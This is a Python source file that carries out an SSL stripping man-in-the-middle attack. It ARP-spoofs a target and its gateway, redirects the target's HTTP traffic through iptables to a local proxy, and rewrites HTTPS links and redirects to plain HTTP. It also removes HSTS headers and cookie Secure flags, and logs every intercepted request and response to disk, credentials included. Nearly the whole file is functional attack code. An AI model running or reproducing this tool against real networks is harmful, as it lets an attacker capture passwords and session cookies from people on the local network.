from scapy.all import *
from arp import *
from helper import *
import traceback
import re
import socket
from BaseHTTPServer import *
import threading
import os
import sys
import string
import time

class sslstrip:
    def __init__(self, target_ip, interface):
        self.target_ip = target_ip
        self.interface = interface
        self.redirect_port = 8080
        
    def set_iptables(self, toRunning):
        if toRunning:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            run_iptables_command("iptables -t nat -I PREROUTING 1 -p tcp --dport 80 -j REDIRECT --to-port %s" % self.redirect_port)
            run_iptables_command("iptables -I FORWARD 1 -p udp --dport 53 -j ACCEPT")
        else:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            run_iptables_command("iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port %s" % self.redirect_port)
            run_iptables_command("iptables -D FORWARD -p udp --dport 53 -j ACCEPT")

    class HTTPStrippingProxy(BaseHTTPRequestHandler):
        def do_GET(self):
            print("Received GET")
            self.handle_request()
            
        def do_POST(self):
            print("Received POST")
            self.handle_request()
            
        def handle_request(self):
            try:
                # Get the host header to get the destination
                host_header = self.headers.get('Host')
                if not host_header:
                    self.send_error(400, "Bad Request: Host header missing")
                
                #Get host and port
                splitted_host = host_header.split(':')
                host = splitted_host[0]
                port = 80 if len(splitted_host) == 1 else int(splitted_host[1])
                
                # connect to server
                skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                skt.connect((host, port))
                
                print("Opened socket with '%s:%s'" % (host, port))
                
                # creafe request
                self.headers['accept-Encoding'] = ''
                headers = "\r\n".join("%s: %s" % (key, value) for key, value in self.headers.items())
                request = "%s %s %s\r\n%s\r\n\r\n" % (self.command, self.path, self.request_version, headers)
                
                if self.command == 'POST':
                    length = int(self.headers.get('Content-Length', 0))
                    data = self.rfile.read(length)
                    request += data
                
                print("--------------------------\nRequest: \n%s\n-----------------------------------" % request)
                self.save_file("request", request)
                # send request
                skt.sendall(request)
                print("Send request")
                
                # receive response
                response = self.receive_data(skt)
                self.save_file("response", response)
                
                skt.close()
                
                print("+++++++++++++++++++++++++\nResponse: \n%s\n+++++++++++++++++++++++++" % response)
                                    
                # Process response and return to victim
                processed_response = self.process_response(response)                
                
                
                print("~~~~~~~~~~~~~~~~~~~~~~~~~~\nProcessed response:\n%s\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" % processed_response)
                self.wfile.write(processed_response)
                
                print("\nReturned proccessed response\n")
                
                
                
            except Exception as e:
                print("Error handling request: %s" % e)
                self.send_error(500, "internal error: %s" % e)                
        
        def save_file(self, name, content):
            if not os.path.exists(name):
                os.mkdir(name)
            with open("%s/%s.txt" % (name, time.ctime()), 'w') as f:
                f.write(content)
                f.close()
                
        def process_response(self, response):
            is_chunked = False
            if re.search(r"Transfer-Encoding: chunked", response, re.IGNORECASE):
                is_chunked = True
            lines = response.split('\r\n')
            status = lines[0]
            
            print("Status: %s, number of lines: %d" % (status, len(lines)))
                
            for i, line in enumerate(lines):
                if line == '':
                    end_of_header = i
                    break
            if not end_of_header:
                return response
                    
            headers = lines[1:end_of_header]   
            
            modified_body = self.modify_body(lines[end_of_header + 1:], is_chunked)
            print("Body modified")
            modified_headers = []
                
            for header in headers:
                print("Modifying: %s" % header)
                modified_headers.append(self.modify_header(header))
            
            print("Modified all headers")
            modified_headers.append('Content-Length: %d' % len(modified_body))
            print(modified_headers)
            return status + '\r\n' + '\r\n'.join([s for s in modified_headers if s is not None]) + '\r\n\r\n' + modified_body
            
                
        def modify_header(self, header):
            if header.lower().startswith('location: https://'):
                return header.lower().replace('https://', 'http://')
            elif header.lower().startswith('strict-transport-security:'):
                return None
            elif header.lower().startswith('set-cookie:'):
                return re.sub(r';\s*secure', '', header, flags=re.IGNORECASE)
            elif header.lower().startswith('transfer-encoding: chunked'):
                return None
            elif header.lower().startswith('content-length: '):
                return None
            else:
                return header
            
        def modify_body(self, bodylines, is_chunked):
            if is_chunked:
                bodylines = self.remove_hex(bodylines)
            body = ''.join(bodylines)
            return re.sub(r'https://', 'http://', body, flags=re.IGNORECASE)
        
        def remove_hex(self, lines):
            non_hex = []
            for s in lines:
                is_hex = True
                for c in s:
                    if c.lower() not in string.hexdigits:
                        is_hex = False
                        break
                if not is_hex:
                    non_hex.append(s)
            return non_hex
            
        def receive_data(self, skt):
            bffr = ""
            
            # Read until end of header is found
            print("Starting to read headers")
            while "\r\n\r\n" not in bffr:
                chunk = skt.recv(4096)
                if not chunk:
                    return ""
                bffr += chunk
                
            header_end = bffr.find("\r\n\r\n")
            headers = bffr[:header_end + 4]
            print("Header bytes: %d" % header_end)
            #print("Headers:\n~~~~~~~~~~~~~~~~~~~~~~~~\n%s\n~~~~~~~~~~~~~~~~~~~~~~\n" % headers)
            body = bffr[header_end + 4:]
            
            # Find length of content
            length_match = re.search(r"Content-Length: (\d+)", headers, re.IGNORECASE)
            
            if length_match:
                # The length was found and must be converted and read
                length = int(length_match.group(1))
                print("Content length found: %d" % length)
                
                body += self.receive_bytes(skt, length - len(body))               
            
            elif re.search(r"Transfer-Encoding: chunked", headers, re.IGNORECASE):
                print("Reading chunked...")
                body = self.read_chunked_bytes(skt, body)
                
            else:
                # No length found, read until socket closes
                print("Reading until socket closes...")
                while True:
                    chunk = skt.recv(4096)
                    if not chunk:
                        break
                    body += chunk
            
            print("Done reading response")
            return headers + "\r\n\r\n" + body
                
        def read_chunked_bytes(self, skt, bdy):
            # answer is chunked
            # there is at least one chunk in bdy
            
            #print("~~~~~~~~~~~~~~~~~~~~~~~~\nCurrently loaded:\n~%s~\n" % bdy)
            
            # Check if there is a \r\n in bdy, else the length is not fully loaded
            if "\r\n" not in bdy:
                # load until full content length is found
                #print("length not fully loaded")
                while "\r\n" not in bdy: 
                    bdy += skt.recv(1)
            
            # Find end of first chunk content length
            i = 1
            while "\r\n" not in bdy[:i]:
                i += 1
            size = int(bdy[:i].strip(), 16)
            end_of_chunk = i + 2 + size
            #print("Chunk size %d, end of chunk: %d" % (size, end_of_chunk))
            if size == 0:
                # Last chunk, always ends with 0\r\n\r\n, may need to load last \r\n
                if len(bdy) < 5:
                    skt.recv(5 - len(bdy))
                #print("Last chunk found")
                return bdy
            
            if end_of_chunk > len(bdy):
                #print("Chunk not fully loaded")
                # Chunk is not fully loaded, load the rest
                bdy += self.receive_bytes(skt, end_of_chunk - len(bdy))
                
            #print("---------------------\nBody returning:\n-%s-\n" % bdy[:end_of_chunk])
            
            # Return chunk and load others
            return bdy[:end_of_chunk] + self.read_chunked_bytes(skt, bdy[end_of_chunk:])
            
                
        def receive_bytes(self, skt, size):
            bytes = ""
            bytes_read = 0
            while bytes_read < size:
                chunk = skt.recv(4096)
                if not chunk:
                    # Socket closed prematurely
                    return ""
                bytes += chunk
                bytes_read += len(chunk)
            return bytes
            
            
    def start_http_proxy(self):
        try:
            print("Starting HTTP strippgin proxy on port %s" % self.redirect_port)
            self.http_server = HTTPServer(("", self.redirect_port), self.HTTPStrippingProxy)
            self.http_server.serve_forever()
        except Exception as e:
            print("Could not start proxy: %s" % e)
            self.stop_http_proxy()
                
    def strip(self):
        try: 
            # Get router ip and start the arp spoof 
            conf.route.resync()
            router_ip = conf.route.route("0.0.0.0")[2]
            arp1 = arp()
            thread = threading.Thread(target=arp1.two_way_arp_spoof, args=(self.target_ip, router_ip, 2, self.interface))
            thread.start()
            
            self.set_iptables(True)
            self.start_http_proxy()
            
        except KeyboardInterrupt:
            print("Stopping ssl stripping attack")
            if self.http_server:
                self.http_server.shutdown()
            self.set_iptables(False)
            arp1.stop_spoof()
            thread.join()
        except Exception as e:
            print("An error occured")
            traceback.print_exc()
            self.set_iptables(False)
            
        
                    
                
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
                    
